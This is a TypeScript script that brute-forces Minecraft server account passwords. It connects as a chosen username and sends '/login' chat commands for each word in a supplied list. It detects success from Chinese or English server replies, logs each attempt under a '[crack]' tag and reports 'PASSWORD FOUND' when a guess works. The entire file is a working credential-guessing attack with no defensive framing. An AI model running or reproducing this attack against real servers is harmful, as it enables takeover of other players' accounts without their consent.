import { McSession, sleep } from '../src/main/engine/modules/lib/mcSession'

const HOST = process.env.TARGET_HOST ?? ''
const PORT = Number(process.env.TARGET_PORT ?? 0)
const USER = process.env.MC_NAME ?? 'VacationPlus'
const WORDS = (process.env.WORDS ?? '')
  .split(',')
  .map((word) => word.trim())
  .filter(Boolean)

async function main(): Promise<void> {
  if (!HOST || !PORT || WORDS.length === 0) {
    throw new Error('TARGET_HOST/TARGET_PORT/WORDS required')
  }
  const session = await McSession.open({ host: HOST, port: PORT }, USER)
  let found: string | null = null
  try {
    for (const [index, word] of WORDS.entries()) {
      const before = session.recentMessages.length
      session.chat(`/login ${word}`)
      await sleep(1800)
      const lines = session.recentMessages.slice(before)
      const success = lines.some((line) =>
        /已成功登录|成功登录|successful login|successfully logged/i.test(line)
      )
      console.log(
        `[crack] ${index + 1}/${WORDS.length} "${word}" ${success ? 'SUCCESS' : 'fail'} | ${lines.map((l) => l.slice(0, 90)).join(' || ') || '(no reply)'}`
      )
      if (success) {
        found = word
        break
      }
      if (session.lastKickReason) {
        console.log(`[crack] kicked: ${session.lastKickReason}`)
        break
      }
      await sleep(1200)
    }
  } finally {
    session.close()
    await sleep(500)
  }
  if (found) {
    console.log(`\n[crack] PASSWORD FOUND: ${found}`)
    process.exit(0)
  }
  console.log('\n[crack] not found in this list')
  process.exit(1)
}

void main().catch((error) => {
  console.error('[crack] FAIL', error)
  process.exit(1)
})
